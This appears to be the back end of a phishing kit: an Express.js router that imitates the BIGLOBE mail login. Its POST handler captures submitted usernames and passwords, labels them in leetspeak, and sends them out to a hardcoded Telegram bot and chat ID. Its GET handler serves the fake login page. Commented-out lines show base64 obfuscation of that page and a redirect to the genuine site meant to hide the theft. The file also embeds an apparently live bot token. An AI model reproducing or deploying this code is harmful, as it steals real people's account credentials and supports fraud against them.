const { Router } = require('express');
const path = require('path');
const fs = require('fs');
const axios = require('axios');

const r = Router();

function send_results(result_message){
    const telegram_chat_id = '-1002398431021';
    const telegram_bot_token = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';

    axios.post(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
        chat_id: telegram_chat_id,
        text: result_message
        })
        .then(function (response) {
        console.log(response);
        })
        .catch(function (error) {
        console.log(error);
        });
}
r.post('/sso/mail', (req, res) => {
    // const redirect_link = 'https://href.li?https://auth.sso.biglobe.ne.jp/mail/';

    const username = req.body.loginid;
    const password = req.body.biglobe_pw;
    // const password = req.body;
    const message = `/B1G L0B3/
Us3rn4m3: ${username}
P4sw0rd: ${password}
C1lENT: 
/B1G L0B3/`;
    send_results(message);
    // res.status(200).send(`<!DOCTYPE html><html><body><script>window.location.href = '${redirect_link}';</script></body></html>`);
    res.status(200).send('good');
});
r.get('/sso/mail', (req, res) => {
    const current_directory = path.resolve(__dirname);
    const public_folder = `${current_directory}/../public`;
    
    const index_file = `${public_folder}/index.html`;
    // const index_file = `index.html';`
    res.set('Content-Type', 'text/html');
    if (!fs.existsSync(index_file)){
        res.status(200).send('Sir thwa ya zaby');
        return ;
    }
    let index_content = fs.readFileSync(index_file);
    // index_content = btoa(index_content);
    // index_content = `<html><head></head><body><script>document.write(atob('${index_content}'));</script></body></html>`;
    // const { name } = req.params;
    // res.json(new SuccessResponseObject('express vercel boiler plate'))
    res.status(200).send(index_content);
});

module.exports = r;
